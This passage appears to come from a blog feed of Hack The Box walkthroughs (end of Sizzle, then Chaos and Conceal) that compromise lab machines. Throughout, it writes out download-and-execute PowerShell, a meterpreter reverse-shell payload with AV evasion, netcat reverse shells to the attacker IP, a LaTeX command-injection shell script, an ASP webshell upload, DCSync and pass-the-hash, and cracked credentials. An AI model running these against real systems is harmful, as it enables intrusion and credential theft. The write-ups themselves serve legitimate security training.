PMobjectguid            : 4bd46301-3362-4eac-9374-dc5cb0b6225dwhencreated           : 7/3/2018 3:52:48 PMusercertificate       :[...]countrycode           : 0samaccountname        : mrlkyobjectclass           : {top, person, organizationalPerson, user}objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=HTB,DC=LOCALaccountexpires        : 12/31/1600 7:00:00 PMusnchanged            : 53342lastlogoff            : 12/31/1600 7:00:00 PMlogonhours            : {255, 255, 255, 255...}Kerberoasting from the WinRM session doesn’t work. I think it’s because our user is authenticated with WinRM instead of Kerberos. Not too sure of the specifics here but it has to do with the type of authentication used.[10.10.10.103]: PS C:\\Users\\amanda\\Documents&gt; powershell -v 2 -ep bypass -command \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/PowerView.ps1'); invoke-kerberoast\"WARNING: [Get-DomainSPNTicket] Error requesting ticket for SPN 'http/sizzle' from user'CN=mrlky,CN=Users,DC=HTB,DC=LOCAL' : Exception calling \".ctor\" with \"1\" argument(s): \"TheNetworkCredentials provided were unable to create a Kerberos credential, see inner execption fordetails.\"We also can’t kerberoast directly from our Kali machine because TCP Port 88 has been intentionally blocked by the box creator.# kerberoast spnroast htb.local/amanda:Ashare1972@10.10.10.103 -u mrlky -r htb.local2019-01-18 13:58:16,096 minikerberos ERROR    Failed to get TGT ticket! Reason: [Errno 110] Connection timed outTraceback (most recent call last):What we can do is get a meterpreter shell on the box and do a port forward so we can access TCP port 88 through the meterpreter tunnel. Defender is enabled and will block any attempt at uploading a straight binary to the server. I used GreatSCT for AV evasion with the msbuild option to bypass AppLocker.Generating the payload with GreatSCR:Payload: msbuild/meterpreter/rev_tcp selectedRequired Options:Name              Value     Description----              -----     -----------DOMAIN            X         Optional: Required internal domainEXPIRE_PAYLOAD    X         Optional: Payloads expire after \"Y\" daysHOSTNAME          X         Optional: Required system hostnameINJECT_METHOD     Virtual   Virtual or HeapLHOST                       IP of the Metasploit handlerLPORT             4444      Port of the Metasploit handlerPROCESSORS        X         Optional: Minimum number of processorsSLEEP             X         Optional: Sleep \"Y\" seconds, check if acceleratedTIMEZONE          X         Optional: Check to validate not in UTCUSERNAME          X         Optional: The required user account Available Commands:  back          Go back  exit          Completely exit GreatSCT  generate      Generate the payload  options       Show the shellcode's options  set           Set shellcode option[msbuild/meterpreter/rev_tcp&gt;&gt;] set LHOST 10.10.14.23[msbuild/meterpreter/rev_tcp&gt;&gt;] set LPORT 443[msbuild/meterpreter/rev_tcp&gt;&gt;] generateDownloading to the server and executing with msbuild.exe (make sure to use 32 bits since payload is 32 bits):[10.10.10.103]: PS C:\\Users\\amanda\\Documents&gt; Invoke-WebRequest -Uri \"http://10.10.14.23/payload.xml\" -OutFile payload.xmlPS C:\\Users\\amanda\\Documents&gt; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe payload.xmlMicrosoft (R) Build Engine version 4.6.1586.0[Microsoft .NET Framework, version 4.0.30319.42000]Copyright (C) Microsoft Corporation. All rights reserved.Build started 1/18/2019 9:40:14 AM.PS C:\\Users\\amanda\\Documents&gt; I now have a meterpreter session.msf5 exploit(multi/handler) &gt; [*] Encoded stage with x86/shikata_ga_nai[*] Sending encoded stage (179808 bytes) to 10.10.10.103[*] Meterpreter session 4 opened (10.10.14.23:4444 -&gt; 10.10.10.103:60672) at 2019-01-18 14:48:41 -0500Then I added a local port forward so the connection to my Kali machine on TCP port 88 will be tunneled and connected to the remote server on the same port:meterpreter &gt; portfwd add -l 88 -p 88 -r 127.0.0.1[*] Local TCP relay created: :88 &lt;-&gt; 127.0.0.1:88meterpreter &gt; portfwd listActive Port Forwards====================   Index  Local       Remote        Direction   -----  -----       ------        ---------   1      0.0.0.0:88  127.0.0.1:88  Forward1 total active port forwards.Now we can kerberoast through our forwarded port but it still fails because of the clock drift between our host and the server:# kerberoast spnroast htb.local/amanda:Ashare1972@127.0.0.1 -u mrlky -r htb.local2019-01-18 14:53:46,934 minikerberos ERROR    Failed to get TGT ticket! Reason: The clock skew is too great Error Core: 37Traceback (most recent call last):I setup my Kali machine to sync to the target box using NTP and I got rid of the clock drift that way.Now we’re able to kerberoast and get the hash for mrlky:# kerberoast spnroast htb.local/amanda:Ashare1972@127.0.0.1 -u mrlky -r htb.local$krb5tgs$23$*mrlky$HTB.LOCAL$spn*$dffa2597262b36b9980bd934bb60ee00$1a0c48f2e50a8e3654f98c0231454e98b711eb8b41e19dc53595e9e71744795a26e04a6d2d320d253ac72efe7ceaebe2a7bda41664ad48a1b9834749690dc493b15033aa670542851bb9d2be388e5c90143f09f31908dd8dcd03179b2cbf35cbca5b8f4f85d7c029c6fe311694ddc6763631a54b070e5f304070397818c3221498a19e5d87168fa11ac7e8a82c715a974a89cad01e15c463ee394c1c175e7f9e8c45fb66576b5c308fd91fca893c1e969635a97bfd7775aa15f57e3c5e1d2effb0cacd9a249ae2e3d4d000ce49e079cf5e4d065f63583615ad75bb76e035d2b67ae85b096fa357e087a421eab77beae5f283034fedfa0ac7c750334bd11062eb5c4297df1a4f4a09fcbe31d64a4003f214262f309583596f2ec15bb9299f8b23c57cba2edd14a4aab2df987f4a0268b783ae40802b87ef92f8fbdb0a38af5987f0b492520c9f5636149f3fe51bc0117c34bed1549cdf09443472533102a35006c5dad7e701d7565b0a2e7bd9407fb976d47bf9d0a95ed9ef333b39e17be825e8b1e9b64f186cefe6c8a28628c8c7da481f85dea018ad3b556b88a966bb3086da54e977b82999bfe69f4580b08f10bf074231fe079ac9f3fa5db4e9c505c2f737f8da7f75bf1b6984fd6dfeb54627474ea4272709c1f8de04a8171fe10da015d2f16e22021fc50ae229838e44d927aa2b431e7faa360da09fb6ba3fcdf0b16f4536d0263f86e940e60c2f347dcc9d3a53f68968d9550d7b35de4015e493346e9943f717f177b4b613b3b34150bd4931dffc55a5d5c534ee3c1c8ff72ea9ecea2799764032907c2a72977cefe0770c4321a10a821195adb4a139127d3c109bdc97224c7e1ff87a0291904f3152d7de0ed069e43daa1e35a21ddf3746c5cb6889b6c442c9902289ae0d4b066fc40c1cc39085116f2924f4f7d023f5ffaa0517c198b413f808e2b53ec1778f8180b39fa370bc77823d316afb240e270b1286d7205d921b7570a72f0c42d789504e586e5569d7b3a9783193765364f1440f21eef0e744b401673762d1dd30289f6fef9d846022c043dedf38483b9850bcb5d8bfb767df4ab5e7e194406ef05a605b4727c4399a58d97262b9eff1dc6a7ab0645ee0cd93d2af0e402e548884d7fe07966ceb78e39ca46eb7cb11964f14b07f7922874716c1bfe12ccf185d92e3d9cea81232d684efaec22398a18c94cb7d71f69ec4ba6296c8a46db94cae2b45a3b587a054115f73ee36ced05e0fINFO:root:Kerberoast completeLuckily for us, the password is weak and we can crack it:# ~/JohnTheRipper/run/john -w=/usr/share/wordlists/rockyou.txt --fork=4 hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be fasterNode numbers 1-4 of 4 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statusFootball#7       (?)2 1g 0:00:00:06 DONE (2019-01-18 10:04) 0.1543g/s 430834p/s 430834c/s 430834C/s Footie123..Foh9iyd=,r^j4 0g 0:00:00:08 DONE (2019-01-18 10:04) 0g/s 437842p/s 437842c/s 437842C/s   cxz..*7¡Vamos!3 0g 0:00:00:08 DONE (2019-01-18 10:04) 0g/s 436776p/s 436776c/s 436776C/s  0125457423 .a6_1231 0g 0:00:00:08 DONE (2019-01-18 10:04) 0g/s 436246p/s 436246c/s 436246C/s  Jakekovac3.ie168Waiting for 3 children to terminateSession completedPassword is: Football#7I went through the same process of generating a certificate for mrkly through the web enrollment page. I was then able to log in with WinRM as user mrlky and get the user flag:PS C:\\Users\\labuser&gt; $sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheckPS C:\\Users\\labuser&gt; enter-pssession -ComputerName 10.10.10.103 -SessionOption $sessionOption -CertificateThumbprint 4c7c243d0a6b2e9c9b1316fbbc8fa5663cebec1c[10.10.10.103]: PS C:\\Users\\mrlky.HTB\\Documents&gt; type c:\\users\\mrlky\\desktop\\user.txta6ca1f....PrivescFor this next part, we’ll add our Windows 10 VM to the domain since both amanda and mrlky have the necessary privileges to add machines.PS C:\\Windows\\system32&gt; add-computer -domainname htb.localcmdlet Add-Computer at command pipeline position 1Supply values for the following parameters:CredentialWARNING: The changes will take effect after you restart the computer DESKTOP-PL1DUQJ.PS C:\\Windows\\system32&gt;After a reboot, we’re able to log in to the Win 10 VM with those two domain accounts.Let’s run SharpHound to pull the data from AD and import it into BloodHound:PS C:\\Users\\mrlky\\documents&gt; .\\sharphound -c AllInitializing BloodHound at 10:51 AM on 1/18/2019Resolved Collection Methods to Group, LocalGroup, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOMStarting Enumeration for HTB.LOCALStatus: 62 objects enumerated (+62 15.5/s --- Using 48 MB RAM )Finished enumeration for HTB.LOCAL in 00:00:04.02738690 hosts failed ping. 0 hosts timedout.Compressing data to .\\20190118105148_BloodHound.zip.You can upload this file directly to the UI.Finished compressing files!We can see here that mrlky has GetChanges and GetChangesAll privileges on the domain so he can DCsync and get hashes for all the usersLet’s try that for the administrator:mimikatz # lsadump::dcsync /user:administrator[DC] 'HTB.LOCAL' will be the domain[DC] 'sizzle.HTB.LOCAL' will be the DC server[DC] 'administrator' will be the user accountObject RDN           : Administrator** SAM ACCOUNT **SAM Username         : AdministratorAccount Type         : 30000000 ( USER_OBJECT )User Account Control : 00000200 ( NORMAL_ACCOUNT )Account expiration   :Password last change : 7/12/2018 9:32:41 AMObject Security ID   : S-1-5-21-2379389067-1826974543-3574127760-500Object Relative ID   : 500Credentials:  Hash NTLM: f6b7160bfc91823792e0ac3a162c9267Now that we have the administrator NTLM hash, we can log in with pass-the-hash to the server and grab the final flag:# /usr/share/doc/python-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies[*] SMBv3.0 dialect used[!] Launching semi-interactive shell - Careful what you execute[!] Press help for extra shell commandsC:\\&gt;whoamihtb\\administratorC:\\&gt;type c:\\users\\administrator\\desktop\\root.txt91c584&lt;redacted&gt;"
  },
  
  {
    "title": "Chaos - Hack The Box",
    "url": "/posts/htb-writeup-chaos/",
    "categories": "hackthebox, infosec",
    "tags": "wordpress, weak credentials, pdf, LaTeX, firefox, saved credentials",
    "date": "2019-05-25 00:00:00 +0800",
    





    
    "snippet": "Chaos starts with some enumeration to find a hidden wordpress site that contains a set of credentials for a webmail site. There’s some simple crypto we have to do to decrypt an attachment and find ...",
    "content": "Chaos starts with some enumeration to find a hidden wordpress site that contains a set of credentials for a webmail site. There’s some simple crypto we have to do to decrypt an attachment and find a hidden link on the site. We then exploit the PDF creation website which uses LaTeX and gain RCE. After getting a reverses shell, we do some digging into the user’s folders and find the webmin root credentials stored in the Firefox user profile.Summary  There’s a hidden wordpress blog with a password protected post  By enumerating the users with wpscan, we find a single user human which is also the password for the protected post  The post contains the credentials for a webmail account on webmail.chaos.htb site  The user mailbox has a message directing us to another hidden URI on the site which contains a PDF maker application  The application uses LaTeX and we can do command injection to get a reverse shell  From www-data we can su to user ayush with the credentials we got from the wordpress post  Searching the ayush home directory, we find a .mozilla directory which has saved root credentials for the Webmin applicationBlog / Tools used  wpscan  https://0day.work/hacking-with-latex/  https://github.com/unode/firefox_decryptNmapServices running:  HTTP server  IMAP &amp; POP3  Webmin (not vulnerable to any CVE as far as I could see)# nmap -sC -sV -p- 10.10.10.120Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-15 17:38 ESTNmap scan report for 10.10.10.120Host is up (0.029s latency).Not shown: 65529 closed portsPORT      STATE SERVICE  VERSION80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))|_http-server-header: Apache/2.4.34 (Ubuntu)|_http-title: Site doesn't have a title (text/html).110/tcp   open  pop3     Dovecot pop3d|_pop3-capabilities: SASL AUTH-RESP-CODE STLS TOP PIPELINING RESP-CODES CAPA UIDL| ssl-cert: Subject: commonName=chaos| Subject Alternative Name: DNS:chaos| Not valid before: 2018-10-28T10:01:49|_Not valid after:  2028-10-25T10:01:49|_ssl-date: TLS randomness does not represent time143/tcp   open  imap     Dovecot imapd (Ubuntu)|_imap-capabilities: Pre-login more SASL-IR capabilities LITERAL+ STARTTLS have LOGIN-REFERRALS post-login listed OK ENABLE LOGINDISABLEDA0001 ID IDLE IMAP4rev1| ssl-cert: Subject: commonName=chaos| Subject Alternative Name: DNS:chaos| Not valid before: 2018-10-28T10:01:49|_Not valid after:  2028-10-25T10:01:49|_ssl-date: TLS randomness does not represent time993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)|_imap-capabilities: Pre-login SASL-IR capabilities LITERAL+ AUTH=PLAINA0001 more LOGIN-REFERRALS have post-login listed ENABLE OK ID IDLE IMAP4rev1| ssl-cert: Subject: commonName=chaos| Subject Alternative Name: DNS:chaos| Not valid before: 2018-10-28T10:01:49|_Not valid after:  2028-10-25T10:01:49|_ssl-date: TLS randomness does not represent time995/tcp   open  ssl/pop3 Dovecot pop3d|_pop3-capabilities: SASL(PLAIN) AUTH-RESP-CODE USER TOP PIPELINING RESP-CODES CAPA UIDL| ssl-cert: Subject: commonName=chaos| Subject Alternative Name: DNS:chaos| Not valid before: 2018-10-28T10:01:49|_Not valid after:  2028-10-25T10:01:49|_ssl-date: TLS randomness does not represent time10000/tcp open  http     MiniServ 1.890 (Webmin httpd)|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelEnumeration of the different pagesThere’s a couple of different web pages:  If an FQDN is not used, we get a page with Direct IP not allowed error message:  The main chaos.htb page is just a generic corporate webpage with nothing else interesting on it:  The page on port 10000 contains a link to HTTPS for the Webmin appObservations:  Nothing interesting on the main page (just a static page)  We can’t log in to the Webmin application (tried guessing credentials, checking CVEs)Dirbusting the websiteNext, let’s dirbust the site to find hidden files &amp; folders:Checking 10.10.10.120# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -s 200,204,301,302 -u http://10.10.10.120/javascript (Status: 301)/wp (Status: 301)Checking chaos.htb# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -s 200,204,301,302 -u http://chaos.htb/css (Status: 301)/img (Status: 301)/javascript (Status: 301)/js (Status: 301)/source (Status: 301)Let’s check out that Wordpress site.WordpressThe site has a single post protected by a password:Next, let’s use wpscan to check for any WP vulnerabilities. There doesn’t seem to be any obvious non-authenticated vulnerability based on wpscan’s output, but we find a single user:# wpscan -u http://10.10.10.120/wp/wordpress...[!] Detected 1 user from RSS feed:+-------+| Name  |+-------+| human |+-------+If we try human as the password for the protected post we get:So we got the following credentials:  user: ayush  pass: jiujitsuAccess to webmailThe note we found refers to webmail, so if we modify our local host file and add webmail.chaos.htb we get to the following page:There’s a message in the Drafts folder containing an encrypted message:We’re provided with the source code of the encryption app, which is basically just using AES in CBC mode and using the sahay name as the password (as the email says). The filesize and IV are stored at the beginning of the output file. We have all the pieces to decrypt the file, we just need to write a quick script to do that.from Crypto import Randomfrom Crypto.Cipher import AESfrom Crypto.Hash import SHA256def getKey(password):    hasher = SHA256.new(password)    return hasher.digest()with open('enim_msg.txt') as f:    c = f.read()filesize = int(c[:16])print(\"filesize: %d\" % filesize)iv = c[16:32]print(\"IV: %s\" % iv)key = getKey(\"sahay\")cipher = AES.new(key, AES.MODE_CBC, iv )print cipher.decrypt(c[32:])The decrypted message is:Hii SahayPlease check our new service which create pdfp.s - As you told me to encrypt important msg, i did :)http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3Thanks,AyushPDF maker appThe hidden directory contains a web application that generates PDF files.The page uses javascript to do an Ajax call to the backend ajax.php file:function senddata() {\tvar content = $(\"#content\").val();\tvar template = $(\"#template\").val();\tif(content == \"\") {\t\t$(\"#output\").text(\"No input given!\");\t}\t$.ajax({\t\turl: \"ajax.php\",\t\tdata: {\t\t\t'content':content,\t\t\t'template':template\t\t},\t\tmethod: 'post'\t}).success(function(data) {\t\t$(\"#output\").text(data)\t}).fail(function(data) {\t\t$(\"#output\").text(\"OOps, something went wrong...\\n\"+data)\t})\treturn false;}The results of the POST request looks like this:So the backend uses LaTeX to convert the data into a PDF. After doing some googling I found a nice blog post about ways to execute arbitrary command using LaTeX.There’s a few commands that are blacklisted, like:  \\input{/etc/passwd}  \\include{password}However the \\immediate\\write18{whoami} command is allowed. The output contains extra stuff but we can see that the whoami command was executed:I wrote a quick python script that sends the commands using the method above and also cleans up the output with some regex:import reimport requestsheaders = {\t'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',\t'X-Requested-With': 'XMLHttpRequest',\t'Cookie': 'redirect=1'}while (True):\tcmd = raw_input('&gt; ')\tdata = {\t\t'content': '\\\\immediate\\\\write18{%s}' % cmd,\t\t'template': 'test1'\t}\tr = requests.post('http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php', headers=headers, data=data)\tout = r.text\tm = re.search('.*\\(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd\\)\\n\\(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd\\)(.*)\\[1', out, re.MULTILINE|re.DOTALL)\tif m:\t\tprint m.group(1)        The output of the script looks like this:# python crapshell.py &gt; whoamiwww-data &gt; iduid=33(www-data) gid=33(www-data) groups=33(www-data) &gt; ls -l /hometotal 8drwx------ 6 ayush ayush 4096 Dec 16 03:32 ayushdrwx------ 5 sahay sahay 4096 Nov 24 23:53 sahayWe still want to get a proper shell so what I did was download nc to the box and then spawn a reverse shell:&gt; wget -O /tmp/nc 10.10.14.23/nc &gt; chmod +x /tmp/nc &gt; /tmp/nc -e /bin/bash 10.10.14.23 4444[...]# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.120] 52378iduid=33(www-data) gid=33(www-data) groups=33(www-data)python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$There’s not much we can do with www-data except look at the web app source code and get the MySQL password for the Wordpress and Roundcube install. But we already have the ayush credentials so we can su to this user and get the user.txt flag:www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ su -l ayushPassword: jiujitsuayush@chaos:~$ cat user.txtCommand 'cat' is available in '/bin/cat'The command could not be located because '/bin' is not included in the PATH environment variable.cat: command not foundayush@chaos:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;l/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binayush@chaos:~$ cat user.txteef391...Privesc through Firefox credentialsRemember that webmin page? By default, the root user credentials are used to log in to the application. When we look at ayush home directory, we see there’s a .mozilla folder in there with some encrypted Firefox credentials in logins.json:ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default$ cat logins.jsoncat logins.json{\"nextId\":3,\"logins\":[{\"id\":2,\"hostname\":\"https://chaos.htb:10000\",\"httpRealm\":null,\"formSubmitURL\":\"https://chaos.htb:10000\",\"usernameField\":\"user\",\"passwordField\":\"pass\",\"encryptedUsername\":\"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==\",\"encryptedPassword\":\"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb\",\"guid\":\"{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}\",\"encType\":1,\"timeCreated\":1540642202692,\"timeLastUsed\":1540642202692,\"timePasswordChanged\":1540642202692,\"timesUsed\":1}],\"disabledHosts\":[],\"version\":2}The formSubmitURL value is https://chaos.htb:10000 so this means the user logged on to the Webmin application and saved the credentials.To decrypt those, we’ll first tar the whole .mozilla directory and nc it to our Kali box, then use firefox_decrypt. The password is the same as the ayush password: jiujitsu# ./firefox_decrypt.py /root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/2018-12-15 21:02:22,369 - WARNING - profile.ini not found in /root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/2018-12-15 21:02:22,370 - WARNING - Continuing and assuming '/root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/' is a profile locationMaster Password for profile /root/chaos/mozilla/.mozilla/firefox/bzo7sjt1.default/: Website:   https://chaos.htb:10000Username: 'root'Password: 'Thiv8wrej~'Nice, we can just su to root and get the last flag:ayush@chaos:~$ su -l rootsu -l rootPassword: Thiv8wrej~root@chaos:~# cat /root/root.txtcat /root/root.txt4eca7e..."
  },
  
  {
    "title": "Conceal - Hack The Box",
    "url": "/posts/htb-writeup-conceal/",
    "categories": "hackthebox, infosec",
    "tags": "asp, ipsec, vpn, rotten tomato",
    "date": "2019-05-18 00:00:00 +0800",
    





    
    "snippet": "Conceal uses IPSec to secure connectivity to the server and nothing is exposed by default except SNMP and IPSec. After finding the preshared key by enumerating with SNMP, we connect to the server, ...",
    "content": "Conceal uses IPSec to secure connectivity to the server and nothing is exposed by default except SNMP and IPSec. After finding the preshared key by enumerating with SNMP, we connect to the server, upload an ASP payload to gain RCE then privesc to SYSTEM using RottenPotato. Not a bad box overall, but the initial part of figuring out the IPSec configuration parameters took me a while to figure out/guessSummary  The box has a security rule configured that only allows clients to connect to it through an IPSec tunnel  SNMP is configured with a default public community string, allowing us to see the IPSec pre-shared key (PSK)  Using an IPSec client such as StrongSwan, we can connect to it but we need to only allow TCP through otherwise the Phase2 negotiation fails  Next, we can access the FTP and HTTP port on the server and locate an /upload directory on the IIS server  We can upload files to the webserver using the FTP anonymous user, gaining RCE with an ASP webshell  The user running the webserver has SeImpersonatePrivilege privilege so we can use JuicyPotato to elevate to SYSTEMPortscanNothing shows up on the TCP nmap scan but IKE is running on UDP port 500.# nmap -sU -F 10.10.10.116Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 22:13 ESTNmap scan report for conceal.htb (10.10.10.116)Host is up (0.027s latency).Not shown: 99 open|filtered portsPORT    STATE SERVICE500/udp open  isakmpSNMPSNMP is running with default public community, we can see with snmp-check that the contact field contains the pre-shared key for the IPSec VPN.# snmp-check 10.10.10.116snmp-check v1.9 - SNMP enumeratorCopyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)[+] Try to connect to 10.10.10.116:161 using SNMPv1 and community 'public'[*] System information:  Host IP address               : 10.10.10.116  Hostname                      : Conceal  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43  Location                      : -  Uptime snmp                   : 02:32:57.70  Uptime system                 : 02:32:29.67  System date                   : 2019-1-7 03:09:29.3  Domain                        : WORKGROUP[...]  VPN connectionThe VPN configuration was pretty tough to put together because IPSec is not very verbose when it fails to connect. The main items that we need to configure specifically are:  Phase1 transform-set: 3des-sha1-modp1024!  Phase2 transform-set: des-sha1!  Connection type: transport  Protocols allowed: [tcp]/etc/ipsec.confconfig setup\tcharondebug=\"all\"\tuniqueids=yes\tstrictcrlpolicy=noconn %default\tauthby=secretconn conceal\tkeyexchange=ikev1\tleft=10.10.14.23\tright=10.10.10.116\trightsubnet=10.10.10.116[tcp]\tauto=add\tike=3des-sha1-modp1024!\tesp=3des-sha1!\ttype=transport/etc/ipsec.secrets%any : PSK \"Dudecake1!\"I also had to lower the MTU of the VMware eth0 interface and both OpenVPN tunnel and IPSec tunnel interfaces, to be certain that I would not have any problems sending large packets. Initially with the default MTU I had issues sending large packets during the FTP upload: the connection would freeze intermittently during the upload or even when interacting with the webshell.# ip a2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1440 qdisc pfifo_fast state UNKNOWN group default qlen 1000[...]7: ip_vti0@NONE: &lt;NOARP&gt; mtu 1360 qdisc noop state DOWN group default qlen 1000[...]17: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1380 qdisc pfifo_fast state UNKNOWN group default qlen 100Once everything is configured, we can successfully connect to the VPN:# ipsec up concealinitiating Main Mode IKE_SA conceal[1] to 10.10.10.116generating ID_PROT request 0 [ SA V V V V V ]sending packet: from 10.10.14.23[500] to 10.10.10.116[500] (176 bytes)received packet: from 10.10.10.116[500] to 10.10.14.23[500] (208 bytes)parsed ID_PROT response 0 [ SA V V V V V V ]received MS NT5 ISAKMPOAKLEY vendor IDreceived NAT-T (RFC 3947) vendor IDreceived draft-ietf-ipsec-nat-t-ike-02\\n vendor IDreceived FRAGMENTATION vendor IDreceived unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024generating ID_PROT request 0 [ KE No NAT-D NAT-D ]sending packet: from 10.10.14.23[500] to 10.10.10.116[500] (244 bytes)received packet: from 10.10.10.116[500] to 10.10.14.23[500] (260 bytes)parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]sending packet: from 10.10.14.23[500] to 10.10.10.116[500] (100 bytes)received packet: from 10.10.10.116[500] to 10.10.14.23[500] (68 bytes)parsed ID_PROT response 0 [ ID HASH ]IKE_SA conceal[1] established between 10.10.14.23[10.10.14.23]...10.10.10.116[10.10.10.116]scheduling reauthentication in 9759smaximum IKE_SA lifetime 10299sgenerating QUICK_MODE request 2486327527 [ HASH SA No ID ID ]sending packet: from 10.10.14.23[500] to 10.10.10.116[500] (164 bytes)received packet: from 10.10.10.116[500] to 10.10.14.23[500] (188 bytes)parsed QUICK_MODE response 2486327527 [ HASH SA No ID ID ]selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQCHILD_SA conceal{1} established with SPIs c9f0dac2_i 65f81cda_o and TS 10.10.14.23/32 === 10.10.10.116/32[tcp]generating QUICK_MODE request 2486327527 [ HASH ]connection 'conceal' established successfully# ipsec statusSecurity Associations (1 up, 0 connecting):     conceal[1]: ESTABLISHED 3 seconds ago, 10.10.14.23[10.10.14.23]...10.10.10.116[10.10.10.116]     conceal{1}:  INSTALLED, TRANSPORT, reqid 1, ESP SPIs: c9f0dac2_i 65f81cda_o     conceal{1}:   10.10.14.23/32 === 10.10.10.116/32[tcp]2nd portscanAfter we’re connected, we can run a portscan again and find additional ports.# nmap -sT -F 10.10.10.116Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-06 22:36 ESTNmap scan report for conceal.htb (10.10.10.116)Host is up (0.032s latency).Not shown: 95 closed portsPORT    STATE SERVICE21/tcp  open  ftp80/tcp  open  http135/tcp open  msrpc139/tcp open  netbios-ssn445/tcp open  microsoft-dsGaining RCE through the IIS webserverThe IIS server has a default page configured.Let’s use gobuster to find interesting stuff on the server:# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.116/upload (Status: 301)Ok, so there’s an upload page and it seems that we can upload files to the IIS root directory with the FTP anonymous account:# echo \"This is a test\" &gt; test.txt# curl -T test.txt ftp://10.10.10.116  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100    15    0     0  100    15      0     53 --:--:-- --:--:-- --:--:--    53# curl http://10.10.10.116/upload/test.txtThis is a testNext, let’s upload an .asp webshell so we can run commands on the server. I used the following webshell: https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp# curl -t curl -T snow.asp ftp://10.10.10.116  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  1356    0     0  100  1356      0   4237 --:--:-- --:--:-- --:--:--  4237We now have RCE and we can grab the user flag from the Destitute user directory.PrivescThe upload directory is located here: C:\\inetpub\\wwwroot\\upload\\snow.aspTo get a proper shell, we can upload nc.exe and run it with C:\\inetpub\\wwwroot\\upload\\nc.exe -e cmd.exe 10.10.14.23 80# nc -lvnp 80listening on [any] 80 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.116] 49684Microsoft Windows [Version 10.0.15063](c) 2017 Microsoft Corporation. All rights reserved.C:\\Windows\\SysWOW64\\inetsrv&gt;whoamiconceal\\destituteC:\\Windows\\SysWOW64\\inetsrv&gt;whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                               State   ============================= ========================================= ========SeAssignPrimaryTokenPrivilege Replace a process level token             DisabledSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        DisabledSeShutdownPrivilege           Shut down the system                      DisabledSeAuditPrivilege              Generate security audits                  DisabledSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled SeUndockPrivilege             Remove computer from docking station      DisabledSeImpersonatePrivilege        Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set            DisabledSeTimeZonePrivilege           Change the time zone                      DisabledRunning whoami /priv, we see that the rights for the user will allow us to use the RottenPotato exploit to elevate to NT AUTORITY/SYSTEM.We need to pick the appropriat CLSID for our OS so first we’ll check which Windows version is running:C:\\inetpub\\wwwroot\\upload&gt;systeminfosysteminfoHost Name:                 CONCEALOS Name:                   Microsoft Windows 10 EnterpriseOS Version:                10.0.15063 N/A Build 15063Next, we 